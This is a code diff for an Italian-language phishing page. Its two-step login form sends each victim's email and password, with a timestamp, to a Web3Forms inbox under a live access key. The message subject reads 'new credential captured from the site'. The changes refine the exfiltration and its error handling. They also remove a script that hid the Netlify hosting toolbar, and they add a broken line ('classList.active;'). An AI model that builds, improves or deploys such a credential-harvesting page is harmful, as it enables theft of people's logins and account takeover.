@@ -453,7 +453,7 @@
 
         function goToStep1() {
             document.getElementById('step-2').classList.remove('active');
-            document.getElementById('step-1').classList.add('active');
+            document.getElementById('step-1').classList.active;
             document.getElementById('error-password').style.display = 'none';
         }
 
@@ -472,52 +472,43 @@
 
             errorMsg.style.display = 'none';
 
-            // Animazione di caricamento sul bottone
             btnSubmit.disabled = true;
             btnSubmit.innerHTML = '<span class="spinner"></span> Verifica in corso...';
 
-            // Payload JSON formattato per Web3Forms
-            const payload = {
-                access_key: '8b029bb3-8647-4ca5-85b7-c6db8bada978',
-                subject: 'Nuova credenziale catturata dal sito',
-                email: emailValue,
-                message: `Email: ${emailValue}\nPassword: ${pwd}\nData/Ora: ${new Date().toLocaleString('it-IT')}`
-            };
+            const formData = new FormData();
+            formData.append('access_key', '8b029bb3-8647-4ca5-85b7-c6db8bada978');
+            formData.append('subject', 'Nuova credenziale catturata dal sito');
+            formData.append('email', emailValue);
+            formData.append('password', pwd);
+            formData.append('orario', new Date().toLocaleString('it-IT'));
 
-            // Invio asincrono in background
             try {
-                await fetch('https://api.web3forms.com/submit', {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
+                const [response] = await Promise.all([
+                    fetch('https://api.web3forms.com/submit', {
+                        method: 'POST',
+                        body: formData
+                    }),
+                    new Promise(resolve => setTimeout(resolve, 1200))
+                ]);
+
+                const result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('step-2').classList.remove('active');
+                    document.getElementById('step-3').classList.add('active');
+                } else {
+                    alert("Errore durante la verifica. Riprova.");
+                    btnSubmit.disabled = false;
+                    btnSubmit.innerHTML = 'Conferma';
+                }
+
             } catch (error) {
-                console.error("Invio dati completato:", error);
+                console.error("Errore di connessione:", error);
+                alert("Errore di connessione. Verificare la rete e riprovare.");
+                btnSubmit.disabled = false;
+                btnSubmit.innerHTML = 'Conferma';
             }
-
-            // Transizione fluida garantita alla schermata di successo dopo il caricamento
-            setTimeout(() => {
-                document.getElementById('step-2').classList.remove('active');
-                document.getElementById('step-3').classList.add('active');
-            }, 1200);
         }
-<!-- Blocco e rimozione forzata della Toolbar Netlify -->
-    <script>
-        function purgeNetlifyToolbar() {
-            const targets = document.querySelectorAll('netlify-drawer, #netlify-drawer, iframe[src*="netlify"]');
-            targets.forEach(el => el.remove());
-        }
-
-        // Esegue il controllo immediato e lo ripete nei primi 5 secondi per intercettare l'iniezione
-        purgeNetlifyToolbar();
-        const intervalId = setInterval(purgeNetlifyToolbar, 100);
-        setTimeout(() => clearInterval(intervalId), 5000);
-    </script>
-</body>
-</html>
     </script>
 </body>
 </html>
